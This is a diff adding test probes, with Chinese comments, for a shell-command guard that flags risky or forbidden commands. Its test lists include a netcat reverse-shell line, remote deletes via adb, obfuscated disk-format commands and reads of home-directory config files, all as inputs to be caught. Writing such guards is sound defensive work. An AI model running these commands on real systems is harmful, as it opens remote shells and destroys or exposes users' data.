@@ -3561,6 +3561,63 @@ check(
     .filter((c) => CommandGuard.assess(c, cmdRoot).forbidden ||
       CommandGuard.assess(c, cmdRoot).risky).join(' | ')
 )
+// —— 第四轮实测（118 探针）：另一套环境执行、外部通道、命令位判定、~/$HOME 出圈 ——
+const hit4 = (c) => {
+  const v = CommandGuard.assess(c, cmdRoot)
+  return v.forbidden || v.risky
+}
+const R4_CHANNEL = [
+  'wsl echo probe_wsl', 'wsl.exe echo probe_wslexe', 'wsl --exec echo probe_exec', 'wsl -u root whoami',
+  'echo ok && wsl touch probes/wsl_write_probe.txt', 'echo hi | wsl tee probes/tee_probe.txt',
+  'wslconfig /l', 'ssh host.example.invalid echo whoami', 'scp a.txt host:~/b.txt',
+  'sftp host.example.invalid', 'nc -e /bin/sh 10.0.0.1 4444', 'telnet host 80',
+  'adb shell rm -rf /sdcard/x', 'rsh host del a.txt'
+]
+check(
+  '把命令交给另一套环境或远端的通道一律判危险（词表管不到那一侧做什么）',
+  R4_CHANNEL.every(hit4),
+  R4_CHANNEL.filter((c) => !hit4(c)).join(' | ')
+)
+const R4_FORMAT_POSITIONS = [
+  'format /?', 'format MYLABEL /Q /Y', 'format NonExistentVolumeLabelProbe_XYZ', '@format MYLABEL /Q /Y',
+  'fo^rmat MYLABEL', 'C:/Windows/System32/format.com MYLABEL', 'cmd /c format MYLABEL',
+  'sh -c "format MYLABEL"', 'echo hi && format MYLABEL'
+]
+check(
+  'format 按命令位硬禁：后面跟什么（盘符、卷标、/? 帮助）都一样，不再只认带冒号的写法',
+  R4_FORMAT_POSITIONS.every((c) => CommandGuard.assess(c, cmdRoot).forbidden),
+  R4_FORMAT_POSITIONS.filter((c) => !CommandGuard.assess(c, cmdRoot).forbidden).join(' | ')
+)
+const R4_VERBS = [
+  'cp a.txt b.txt', 'install -m 644 a.txt out/a.txt', 'truncate -s 0 big.txt', 'ln -s a.txt link',
+  'chattr +i f.txt', 'find . -name "*.log" -delete', 'find . -name x -exec rm {} ;',
+  'wsl cp probes/payload.txt probes/copy_probe.txt', 'wsl truncate -s 0 probes/f.txt'
+]
+check(
+  '名字普通、参数就是破坏力的动词按命令位判危险（cp/install/truncate/ln/chattr/find -delete|-exec）',
+  R4_VERBS.every(hit4),
+  R4_VERBS.filter((c) => !hit4(c)).join(' | ')
+)
+const R4_HOME = [
+  'ls ~', 'cat ~/.bashrc', 'find ~ -maxdepth 1 -type d', 'echo $HOME', 'ls $HOME/.config',
+  'wsl head -3 ~/.bashrc', 'wsl ls /mnt'
+]
+check(
+  '~ / $HOME 由 shell 展开成主目录，属于工作区之外：字面路径规则看不见，这里补上',
+  R4_HOME.every(hit4),
+  R4_HOME.filter((c) => !hit4(c)).join(' | ')
+)
+const R4_QUIET_COMMANDS = [
+  'npm run format', 'yarn format src', 'make install', 'echo cp x > log.txt', 'let cp = 1',
+  'cp = shutil.copy(src, dst)', 'ln = os.path.join(a, b)', 'touch new.txt', 'mkdir -p out',
+  'tar -cf out.tar probes', 'git log HEAD~1..HEAD --oneline', 'git log --format=%h -3',
+  'tasklist', 'dir src /b', 'git status', 'node scripts/build.mjs', 'python parse.py notes.txt'
+]
+check(
+  '命令位判定不误伤日常写法：format/install/cp/ln 出现在脚本名、变量名或别的程序参数里时保持静默',
+  R4_QUIET_COMMANDS.every((c) => !hit4(c)),
+  R4_QUIET_COMMANDS.filter(hit4).join(' | ')
+)
 check(
   '空命令与超长命令都按硬禁处理（人无法审阅）',
   CommandGuard.assess('', cmdRoot).forbidden && CommandGuard.assess('x'.repeat(5000), cmdRoot).forbidden
